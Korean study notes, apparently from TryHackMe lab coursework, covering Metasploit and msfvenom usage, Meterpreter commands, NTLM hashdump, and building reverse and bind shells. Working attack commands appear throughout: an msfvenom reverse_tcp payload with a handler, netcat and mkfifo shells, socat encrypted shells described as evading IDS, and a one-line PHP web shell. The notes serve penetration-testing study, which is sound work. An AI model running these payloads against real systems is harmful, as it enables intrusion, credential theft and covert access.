



## msf

msfconsole 은 context 로 관리된다. 
그러니까 전역 변수로 세팅되지 않으면 모든 파라미터 세팅들은 사용하고자 하는 모듈을 변경하면 날아갈거다.
로컬 변수 세팅은 
`set rhosts 10.10.165.39`
전역 변수 세팅은 
`setg rhosts 10.10.165.39`
로 가능하다

use module
을 하게되면 context 가 변경됨. 이를 enter 라고 함. 

`show options`
는 선택한 exploit 과 관련된 옵션들을 출력해줌. 
context 에 따라 다른 출력물일것이다. 이를 테면 RHOSTS, RPORT 같은 variable 을 세팅하라고 할 것이다. 
반면에 post-exploitation module 은 SESSION ID 만 요구할 것이다. 
session 은 post-exploitation module 이 사용할 target system 에 존재하는 연결을 의미함. 

`show payloads`

`back` command 를 사용하면 context 를 벗어날 수 있음. 
`info` 를 context 내에서 모듈에 대한 사용하면 많은 정보를 준다.

`search` command 를 사용하면 CVE 와 관련된 exploit 들을 검색해줌. 
그러니까 함께 준 search parameter 와 관련된 모듈들을 찾아주는 것임. 
예를 들면, CVE number 나 exploit name(eternealblue, heartbleed, 등등) 혹은 타겟 시스템을 사용해서 검색을 수행할 수 있다는 것 

Meterpreter ; 
meterpreter agent 라는 Payload 가 있음. 이게 target system 에 로드돼서 얘가 내 컴퓨터에 다시 접속하는 형태로 연결되면 meterpreter prompt 로 볼 수 있음. 

# 모듈 사용하기

모든 모듈 파라미터를 설정했다면 이제 `exploit` 커맨드를 사용해서 모듈을 실행시킬 수 있다. 
run 이라고 하는 커맨드도 alias 로 제공되는데 그 이유는 exploit 이 아닌 모듈들에 exploit 을 하는게 말이 안되기 때문이다. 
예를 들면 port scanner, vulnerability scanner 같은 것들을 실행하는데 exploit 이라고 하는 것은 이상하기 때문. 

exploit -z 로 실행하면 exploit 을 실행하고 session 이 열리자마자 session 을 background 로 감춤


# 세션

vulnerability 가 성공적으로 exploit 되면 session 이 생성될 것이다. target system 과 metasploit 간에 생성된 통신 채널임. 

background command 를 이용해서 session prompt 를 background 로 감추고 msfconsole prompt 로 돌아갈 수 있음. 
혹은 ctrl+z 로도 백그라운드로 만들 수 있음. 


sessions command 로 현재 존재하는 session 들을 확인할 수 있음. 
세션에 붙으려면 session -i 2 이런 식으로 attach 가능


# db 이용하기

postgresql 을 서비스로 실행함
systemctl start postgresql 
database init
msfdb init
workspace add
workspace -a tryhackme
nmap 으로 스캔한 결과물을 모두 db 에 저장
db_nmap -sV -p- 10.10.12.229
db 에 저장된 결과를 기반으로 host 들 나열
hosts
서비스들 나열
services


Metasploit 을 사용하면 어떤 치명적인 취약점도 'low hanging fruit' 으로 보이게 된다. 
쉽게 파악하고 이용할 수 있는 취약점이란 뜻이다. 그리고 어떤 시스템에 대한 발판을 얻게 해줄 수 있고 어떤 경우에는 root 또는 관리자 권한을 얻게 해줄 수 있다는 뜻이다. 

Metasploit 을 사용해서 취약점을 찾는 것은 대상에 대해 scan 하고 fingerprint 를 하는 것에 크게 의존한다. 
이런 단계에서 더 잘할수록 MEtasploit 은 더 많은 옵션들을 제공할 것이다. 
예를 들면 target system 에 돌고 있는 vnc service 가 있을 때 Metasploit 에서 search function 을 사용할 수 있다. 
그 결과는 payload 와 post module 들을 갖고 있다. 


대부분의 exploit 들은 default payload 프리셋을 지니고 있을텐데, 언제든지 show payload 를 사용해서 사용할 수 있는 목록들을 볼 수 있음. 

잘 동작하는 payload 를 선택하는 거는 trial and error 가 될 수도 있다. 왜냐하면 방화벽 룰, 안티바이러스 같은 OS 제한이나 환경제한 때문에.

msfvenom 은 msfpayload 랑 msfencode 를 대체해버린 녀석이고 이게 payload 를 생성하도록 도와줄 것이다. 

msfvenom 이 metasploit framework 상에서 가능한 모든 payload 에 접근할 수 있게 해준다. 그리고 매우 다른 포맷들에서 payload 를 생성하게 해줄 것이다. 
예를 들면 php, exe, dll, elf 등의 포맷들. 그리고 다양한 target system 에 대해 가능함. 


Encoders 

일반적인 상식과 반대로 encoders 는 antivirus 를 우회하는게 목표가 아니다. 이름이 암시하는 것과 같이 payload 를 encode 할 뿐이다. 
어떤 antivirus software 에 대해서 효과적일 수 있으나 현대 난독화 기술을 사용하거나 shellcode 를 삽입하는 방법을 배우는 것이 더 좋은 우회방법이다. 
encoding 예시는 다음과 같음
-e param 을 이용해서 php version 의 meterpreter 가 base64 로 인코딩 되고 output format 은 raw다. 


Handlers

reverse shell 을 사용하는 exploit 과 유사하게 MSFvenom payload 에 의해 생성된 incoming connection 을 받아야할 수도 있다. 
exploit omdule 을 사용할 때 이 부분이 자동으로 exploit module 에 의해 처리가 된다. 이 때 reverse shell 을 구성할 때 어떻게 payload options title 이 보여질지 기억할 거다. catching a shell 이라는 용어가 일반적으로 target 으로부터 연결을 받는다는 용어로 사용된다. reverse shell 이나 meterpreter callbacks 들은 쉽게 handler 를 사용해서 catch 할 수 있음. 

결국 handlers 를 이용해서 들어오는 connection 을 처리하는 것을 할 수 있고, 어떤 처리를 해줄지를 payload 로서 지정한다. 

THM 에서 나온 문제에서는 MSFvenom 으로 만든 payload 를 target system 에 주입( 이 과정은 단순히 scp 나 wget 을 통해 처리함) 한 뒤 
attacking machine 에서 handler 에 payload 를 등록해서 대기하도록 한다. 이 때 두 payload 는 한 쌍을 이룸. 

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost=10.10.x.x
set lport=xxxx
run
```

이후 target machine 에서 직접 payload 를 실행한다. 실제 시나리오에서는 이 부분도 어떤 메커니즘으로 실행되게 해야겠지
그러면 meterpreter 가 뜨면서 session 이 연결됨. 
위 과정에서 payload 를 지정안했다면 실패가 나게 되는데, 한 번이라도 실패가 생기면 이후 과정에도 문제가 발생하기때문에 다시 msfconsole 을 실행해야한다. 
session 이 연결되면 background 로 숨기고 post module 을 실행하러 간다. 

```
background
use post/linux/gather/hashdump
set session 1
run
```


Meterpret 

Meterpreter 는 metasploit payload 임. penetration testing process 를 다양한 components 들로 지원하고 있다. 
target system 에서 실행되며 command and control architecture 속의 agent 로서 역할한다. 
그러니까 그냥 remote controller agent
target operating system , file 들과 상호작용할 거고 meterpreter 의 특별한 command 를 사용하게 될거다. 

target system 에 따라 다양한 기능들을 제공하는 여러 버전들이 존재한다. 

Meterpreter 의 동작방식은 다음과 같다. 

target system 에서 실행되지만 설치된 것은 아니다. memory 상에서 돌아가지만 target system 의 disk 에는 존재하지 않음. 
이런 기능은 antivirus scan 에서 잡히지 않기 위함이다. 
기본적으로 많은 antivirus software 는 디스크 상의 새 파일들을 스캔한다. 

또한 meterpreter 는 network 기반의 IPS(Intrusion Prevention System, 침투 방지 시스템) 과 IDS(Intrusion Detection System, 침투 감지 시스템) 에 의해 
발견되는 것도 피하고자 한다. 암호화된 통신으로 attacking system 과 통신하여 회피함. target organization 이 복호화하지 않고 암호화된 트래픽을 조사하지 않는다면 IPS, IDS 솔루션은 그런 활동을 감지할 수 없다. 

예를 들면, meterpreter 로 연결된 세션에서 
pid 와 ps 로 내 프로세스를 찾아보면 spoolsv.exe 로 나온다. 
그렇다면 이 process 가 사용하는 라이브러리는 특별할까? 
`tasklist /m /fi "pid eq 1304"` 로 확인해보더라도 주목할만한 dll 이 나오지 않을 것이다. 


meterpreter payload 는 두 종류가 있다. 
* stagged payalod
  * 두 단계로 payload 가 전송됨. 첫 번째 단계의 payload 를 stager 라고 하는데 이게 설치되고 난 뒤 나머지 payload 를 요청하는 형태.
  * 첫 pyaload 사이즈를 줄일 수 있음.
  * 이는 탐지를 회피하거나 네트워크 제약을 우회하는 데 유리하기 때문
* inline payload
  * 한 단계에 바로 payload 를 보내는 방법.
 

meterpreter 버전을 선택할 때는 다음의 세가지 요소를 고려해라

* target os ( windows? mac? android? or ...)
* target system 에서 사용할 수 있는 컴포넌트( python 이 설치됐는가? php website 인가? ...)
* target system 에 연결가능한 네트워크 타입 ( raw TCPc onnection 을 허용하는가? https reverse connection 만 할 수 있는가? ...)

msfvenom 으로 생성한 standalone payload 를 사용하지 않을 거라면, 선택은 exploit 에 의해 제한될 거다. 
어떤 exploit 들은 default meterpreter payload 가 있다는 걸 알것이다. 

Meterpreter 는 단순히 reverse shell 만은 아님. 
meterpreter> help 

라고 치면 가능한 커맨드 목록이 나온다. 

Core commands

background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session
File system commands

cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory
Networking commands

arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table
System commands

clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as 
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS
Others Commands (these will be listed under different menu categories in the help menu)

idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database


이 중 몇가지를 짚자면, getuid 로 내 권한 정도를 알 수 있다. 
예를 들면, 
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
라고 나오면 windows system 에서 admin 권한임. 

migrate 은 다른 프로세스로 migration 하는 것이다. 예를 들면, word processor 가 target system 에서 실행되고 있는 것을 확인했다. 
word processor 로 migrate 하면 word processor 에 유저가 타이핑하는 keystroke 를 캡쳐할 수 있다. 
어떤 Meterpreter version 은 keyscan_start/stop/dump 라는 것을 제공할텐데, meterpreter 가 keylogger 처럼 동작하게 할 수 있다. 
다른 프로세스로 migrate 하는 거는 더 안정적인 meterpreter session 을 확보하는데 도움을 줄 수 있다. 

어떤 프로세스로 migration 하기 위해서는 migrate PID 를 하면 된다. 


Hashdump

hashdump 커맨드는 SAM database 의 내용을 리스팅 해준다. SAM(Security Account Manager) 데이터베이스는 유저의 암호를 windows system 상에 저장하고 있다. 
이 암호들은 NTLM(New Technology LAN Manager ) format 으로 저장되어있다. 

수학적으로 이 해쉬값들을 crack 할 수는 없지만 cleartext password 를 online NTLM database 를 사용하거나 rainbow table attack 을 이용해서 확인할 수 있다. 
이 hash 들은 또 Pass-the-Hash attack 에 사용해서 이 유저들이 접근가능한 네트워크 상의 다른 시스템들에 인증할 수 있다. 


Search

특정 파일들이나 원하는 정보가 있는 곳을 찾는데 유용함. 

```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```

https://crackstation.net/
이 사이트에서는 Ntlm hashdump 로 얻은 hash 를 평문으로 변환해주는 사이트임
어떻게 이게 가능한거지? 원리가 궁금하다. 
ntlm hashdump 는 meterpreter 에서 hashdump 를 했을 때 windows target 에서 나오는 hash 
`jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::`
여기서 69596으로 시작하는 Hash

아마도 레인보우 테이블 공격(Rainbow Table Attack) 으로 동작하는 것으로 보임. 미리 hash-cleartext 테이블을 구축해뒀을 것. 
NTLMv2 처럼 salt 가 적용된 hash 에는 효과적이지 않다고 함. 

NTLM 이란 

Windows New Technology LAN Manager (NTLM) 은 MS 가 제공하는 보안 프로토콜임. 지금은 kerberos 에 의해 대체되었다고 함. 
user id 를 인증하고 그들의 동작의 integrity 와 confidentiality 를 보호하는 것임. 주 목적은 SSO tool 이었음. 

https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/



# Priviledge  escalation

reverse shell ; 서버가 나에게 연결해서 만든 쉘
서버가 연결하는 꼴이기 때문에 firewall rule 을 우회하기 위한 좋은 방식임. 
그러나 단점은 internet 을 통해 shell 을 받을 때 네트워크 설정이 그 쉘을 받을 수 있어야함. 예를 들면 public domain 을 갖고있다든

bind shell ; 서버는 포트 열고 기다리고 내가 연결해서 만든 쉘

reverse shell 을 받기 위해 혹은 bind shell 을 보내기 위해 사용하는 다양한 툴들이 있음. 

netcat ; Swiss Army Knife of networking. 모든 종류의 network interaction 을 직접 수행하는데 사용됨. 예를 들면, enumeration 동안 banner 잡기
reverse shell 받기, remote port 에 연결하기.=> reverse shell/ bind shell 

socat ; 고도화된 netcat 버전이라고 보면 됨. 모든 기능을 다 커버하면서 더 많은 걸 할 수 있음. 별 다른 수정 없이도 netcat shell 보다 더 안정적임. 
그러니까 상위호환인셈. 
문법은 더 어렵다. netcat 은 기본적으로 모든 리눅스 배포판에서 설치가 되어있는데 socat 은 거의 그렇지 않음. 


netcat 으로 reverse shell 을 구축하는 방법은 아래와 같음
```
On the attacking machine:

sudo nc -lvnp 443

On the target:

nc <LOCAL-IP> <PORT> -e /bin/bash
```


netcat shell 에 연결됐다 치고 다음은? 
netcat 은 불안정해서 ctrl+c 만 눌러도 모든게 다 죽어버림. 
이는 netcat shell 들이 실제로 터미널 속에서 실행되는 프로세스들이기 때문임. 딱히 진짜 터미널이라서 그런건 아님
다행히 netcat shell 을 리눅스 시스템에서 안정화시킬 여러 방법들이 존재함. 

그 방법 중 하나는 python 임. 

기본적으로 다들 python 이 깔려있으므로 적용하기에 좋음. 

```
python -c 'import pty;pty.spawn("/bin/bash")'
```
를 하면 python 이 더 좋은 기능의 bash shell 을 생성해준다. 
물론 여전히 autocomplete 이나 arrow key 는 안먹힐거임. 그리고 ctrl+c 가 shell 을 죽이는 것도 마찬가지일거임. 

다음 단계로 
```
export TERM=xterm --
```
를 하면 clear 같은 터미널 커맨드를 사용할 수 있게 된다. 

마지막으로 가장 중요한, 
shell 을 ctrl+z 로 백그라운드로 보낼 수 있다. 
attacking machine 의 우리 터미널로 가서 
```
stty raw -echo; fg 
```
를 하면 우리 터미널의 Echo 를 끄게 된다. 이로서 victim terminal 에서의 tab autocomplete 과 arrow key, ctrl+c 가 가능해진다. 
그다음에 fg 는 쉘로 붙는 것을 해줌. 

사실 걍 이짓할 필요 없이 socat 쓰면 되는데 windows 에서는 socat 이 더 불안정하다는 소리도 있음. 

Socat

socat 의 뛰어난 것 중 하나는 암호화된 shell 을 생성할 수 있다는 것이다. bind/reverse shell 모두 가능하다. 
왜 이런 짓을 하고싶을까? 암호화된 shell 은 복호화키 없이는 감청할 수 없다. 
그 결과 IDS 를 우회할 수 있다. 

encrypted shell 을 사용할 때는 TCP 로 사용된 커맨드는 openssl 로 대체되어야함. 
그 전에 인증서에 대해서 말해보자

encrypted shell 을 사용하려면 인증서를 생성할 필요가 있음. 
이는 attacking machine 에서 매우 간단한 일


```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

이 커맨드는 2048 bit RSA key 와 그에 대응되는 인증서(cert file) 을 생성한다. 이 인증서는 스스로 서명했으며 1년 미만(362일)의 유효기간을 지닌다. 
이 커맨드 실행하면 인증서에 대한 정보를 기입하라고 한다. 
빈칸으로 두면 random으로 채워넣음. 
그러고 나면 우리는 두개의 생성된 파일을 .pem 으로 합쳐야함. 

```
cat shell.key shell.crt > shell.pem
```

이제 reverse shell listener 를 만들었다면 이렇게 사용함

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

이 커맨드는 우리가 생성했던 인증서를 이용해서 OPENSSL listener 를 만든다. verify=0 의 의미는 
connection 에게 우리 인증서가 적절히 recognised authority 에 의해 서명됐는지 검증하려고 하는 수고를 하지 말라는 의미다. 
인증서는 어떤 device 가 listening 하고 있는지 상관없이 사용되어야한다는 것을 명심해라

victim 이 connect 하는 거는 아래와 같음

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

동일한 기술이 bind shell 에도 사용된다. 

```
Target:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

windows target 에도 역시나 인증서가 listener 에서 사용된다. 그래서 bind shell 이라면 PEM 파일을 복사해서 넘겨주는 작업이 필요하다. 


windows 에서는 -e 옵션이 가능한 netcat 이 있는듯 함. 그런데 linux 에서는 -e option 이 거세된 netcat 이 있을 때가 있음. 
이러면 다음과 같은 방법이 가능함. 

```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

named pipe 를 만드는 mkfifo 를 이용해서 우회가 가능한 셈. 
named pipe /tmp/f 를 만들고 netcat listener 를 시작함. 그리고는 listener 의 input 을 named pipe 의 output 에 연결.
netcat listener 의 output (우리가 보낸 커맨드) 는 pipe 로 sh 에 보냄. 그리고 stderr output stream 을 stdout 에도 보냄. 
그리고 stdout 은 named pipe 에 보냄. 
named pipe -(클라이언트에게 보낼 것)-> nc listener -(클라이언트에게서 받아온것)-> sh -> named pipe



이제 msfvenom 을 다시 보자

여기에 두 컨셉이 있는데
Staged vs Stageless

staged payloads 는 두 단계에 걸쳐서 보내진다. 첫 부분은 stager 라 불리는 것. server 에서 직접적으로 실행되는 코드 조각
이 코드(stager) 는 기다리고 있는 listener 에게 연결을 하는데 어떤 reverse shell code 를 가지고 있지 않다. 
그 대신 listener 에게 연결하고 그 연결로 진짜 payload 를 받아와서 올리는 역할을 한다. 
traditional anti-virius solution 이 disk 를 건드려서 실행하는 애들을 검사하기 때문에 이를 피할 수 있는 효과가 있다. 
그래서 payload 는 두 부분으로 나뉜다. 작은 부분이 초기 stager, 더 큰 쪽이 reverse shell code 로 stager 가 활성화 되면 다운로드 하게 되는 녀석이다. 
staged payload 는 특별한 listener 가 필요함. 주로 Metasploit multi/handler 임. 

Stageless payload 는 더 사용하기도 쉽고 잡히기도 쉬움. staged payload 는 사용하기에 어렵지만 initial stager 는 더 짧고 종종 구린 antivirus 가 잡을 수 없다. 
요즘 antivirius solution 은 AMSI(Anti-Malware Scan Interface) 를 사용해서 payload 를 잡아낼거임. 왜냐면 결국 payload 는 stager 에 의해 메모리에 올라갈 것이기 때문. 



자 이제 shell 을 탈취했다고 치자. 그 다음엔 뭘 해야하는가? 

리눅스에서는 이상적으로 user account 에 대한 접근 권한을 얻고자 할 것이다. ssh key 는 /home/<user>/.ssh 에 저장되어있음. CTF 에서는 
box 내에 어딘가에 존재하는 credential 을 종종 찾으라고 한다. 
어떤 exploit 들은 내 계정을 추가할 수 있도록 해준다. 
DirtyC0w 나 writeable /etc/shadow, /etc/passwd 는 ssh 접근권한을 빠르게 줄 수 있음. 

윈도우에서는 이런 옵션들이 더 제한되어있음. registry 에서 실행중인 서비스에 대한 password 를 찾는 것이 종종 가능하다. 
VNC server 가 그 예 중 하나다. 종종 password 를 레지스트리에 평문으로 남겨둔다. 
FileZilla FTP server 의 어떤 버전도 credential 을 XML file 에 남겨둔다. 
버전에 따라 다르지만, MD5 hash 나 평문형태로 남겨둔다. 

system user 혹은 admin 계정으로서 실행되는 shell 을 윈도우에서 얻을 수도 있다. 
그런 상황에서 admin group 에 새로이 공격자의 계정을 추가하는 것이 가능하다. 그리고 RDP,telnet, winexe, psexec, WinRM 등등 상에서 login

결국에는 reverse/bind shell 이 rce 를 위해 필수적인 방법이지만 이는 결코 fully featured native shell 이 될 수 없기 때문에 이를 통해 
일반적인 방법으로 해당 머신에 접근할 수 있도록 하는 escalation 으로서 사용되어야함. 




php upload and execute 이 가능한 경우에 아래와 같은 간단한 payload 를 사용할 수 있다. stager 인 셈. 

```
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
